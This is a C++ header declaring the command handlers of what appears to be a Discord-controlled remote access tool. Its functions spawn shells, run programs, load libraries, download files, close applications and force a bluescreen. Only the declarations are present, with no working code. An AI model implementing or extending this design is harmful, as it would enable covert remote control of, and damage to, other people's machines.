#pragma once
#include <string>
#include <vector>
#include <iostream>
#include <dpp/dpp.h>

std::string command_popup(std::vector<std::string> args);

std::string command_cmdspawn(std::vector<std::string> args);

std::string command_applicationclose(std::vector<std::string> args);

std::string command_applicationlist(std::vector<std::string> args);

bool ends_with(std::string const& fullString, std::string const& ending);

std::string command_runprogram(std::vector<std::string> args, const dpp::message_create_t evnt);

std::string command_loadlibrary(std::vector<std::string> args, const dpp::message_create_t evnt);

std::string command_changebackround(std::vector<std::string> args, const dpp::message_create_t evnt);

std::string command_downloadfile(std::vector<std::string> args, const dpp::message_create_t evnt);

std::string command_bluescreen(std::vector<std::string> args);